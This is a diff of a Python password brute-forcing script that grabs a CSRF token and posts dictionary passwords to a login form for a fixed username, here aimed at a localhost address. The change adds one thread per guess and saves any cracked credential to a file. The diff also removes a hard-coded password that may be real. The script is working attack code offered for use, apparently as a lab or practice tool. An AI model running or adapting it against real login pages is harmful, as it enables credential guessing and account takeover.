@@ -1,10 +1,12 @@
 #coding=utf-8
 import sys
 import requests
+from threading import Thread
 from bs4 import BeautifulSoup
 
 UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:56.0) Gecko/20100101 Firefox/56.0"
 URL = 'http://127.0.0.1:5000/login'
+savefile = 'foundPWD'
 
 def GET():
     session=requests.Session()
@@ -40,22 +42,23 @@ def POST(user,password,UA,token,session):
 # brute the password of special user
 def brute(user,password):
     csrf_token,session=GET()
-    return POST(user,password,UA,csrf_token,session)
+    if POST(user,password,UA,csrf_token,session)==1:
+        with open(savefile,'w') as f:
+            f.write("user:%s, pws: %s"%(user,password))
 
 def main():
     tsk = []
-    dictfile='top50000pwd'
+    dictfile='pass_dict'
     user='zlzlmyidol'
     with open(dictfile,'r',encoding='utf-8') as f:
         for line in f.readlines():
             pwd=line.strip('\n')
-            ret=brute(user,pwd)
-            if ret==1:
-                break
+            t=Thread(target=brute,args=(user,pwd))
+            t.start()
 
 def DEBUG():
     user='zlzlmyidol'
-    password='z87915964'
+    password='123456'
     brute(user,password)
 
 _DEBUG=False
